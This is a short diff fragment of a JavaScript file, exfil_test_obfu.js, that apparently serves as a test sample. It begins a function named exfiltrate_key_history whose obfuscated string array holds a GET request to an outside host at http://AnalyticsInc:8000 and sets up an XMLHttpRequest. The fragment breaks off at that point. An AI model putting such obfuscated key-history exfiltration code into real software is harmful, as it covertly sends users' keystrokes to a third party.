@@ -1,3 +1,4 @@
+// exfil_test_obfu.js
 function exfiltrate_key_history() {
   var _0x2e14 = ["GET", "http://AnalyticsInc:8000/submission.html?", "test=java_obfuscator", "open", "send"];
   xmlhttp = new XMLHttpRequest;
